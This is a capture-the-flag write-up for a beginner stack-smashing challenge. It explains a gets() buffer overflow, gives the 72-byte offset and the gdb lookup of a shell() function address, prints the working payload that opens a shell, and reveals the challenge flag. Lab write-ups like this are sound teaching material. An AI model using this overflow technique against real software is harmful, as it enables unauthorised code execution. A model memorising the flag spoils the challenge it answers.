### **Challenge Name: Exploit 100 - Smack Stashing**

---

### **Description**

This challenge pays homage to the golden days of stack smashing and buffer overflow vulnerabilities. Inspired by Aleph One's legendary article *"Smashing The Stack For Fun And Profit"* in Phrack #49, the challenge is a faithful reproduction of a classic exploit scenario.

#### **Files Provided**  
- [Exploit100-3](Resources/Exploit100-3)  
- [Exploit100-3.c](Resources/Exploit100-3.c)

---

### **Approach**

#### **Step 1: Analyze the Source Code**
The provided C source code (`Exploit100-3.c`) reveals a `shell()` function that executes a `/bin/sh` shell using `system()`. The presence of a vulnerable `gets()` function signals a classic stack smashing opportunity.

#### **Step 2: Set Up Environment**
Enable core dumps to analyze crashes:
```bash
ulimit -c unlimited
```

#### **Step 3: Trigger Buffer Overflow**
Executed the program and injected increasing input sizes to locate the exact offset for buffer overflow:
```bash
python -c "print('a'*72)" | ./Exploit100-3
```
Segmentation fault occurred at **72 bytes**, confirming the buffer size.

#### **Step 4: Find `shell()` Address**
Using `gdb`, identified the address of the `shell()` function:
```bash
gdb ./Exploit100-3
break shell
run
info functions
```
Address: `0x0000000000401166`

#### **Step 5: Craft Exploit Payload**
Constructed the payload:
1. **Padding:** 72 `A`s to overwrite the buffer.
2. **Address:** `shell()` function address in little-endian format.

Final payload:
```python
python -c "print('a'*72 + '\x66\x11\x40\x00\x00\x00\x00\x00')" | ./Exploit100-3
```

#### **Step 6: Obtain Flag**
Once in the shell, navigated to the flag file:
```bash
ls
cd /home/Exploit100-3
cat Exploit100-3_flag.txt
```

---

### **Flag**

`poctf{uwsp_br4v3_n3w_w0rld}`

---